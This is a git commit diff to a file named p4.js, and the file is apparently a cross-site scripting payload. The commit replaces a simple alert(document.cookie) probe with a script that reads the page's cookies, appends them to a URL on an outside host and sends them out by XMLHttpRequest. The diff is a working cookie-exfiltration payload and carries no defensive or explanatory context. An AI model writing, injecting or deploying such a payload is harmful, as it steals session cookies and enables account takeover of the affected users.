ba3c2976e9d41efd6d90239f0c96ae2c5ddf8715
Angelopezmacc <49574428+Angelopezmacc@users.noreply.github.com>
2022-03-25 12:51:36 -0500

    Update p4.js

--- p4.js
+++ p4.js
@@ -1,1 +1,12 @@
-<script> alert(document.cookie) </script >
+<script>
+  var c = document.cookie;
+  const Http = new XMLHttpRequest();
+  var url_destino = 'https://google.com/' + c;
+  const url= url_destino;
+  Http.open("GET", url);
+  Http.send();
+
+  Http.onreadystatechange = (e) => {
+    console.log(Http.responseText)
+  }
+</script>
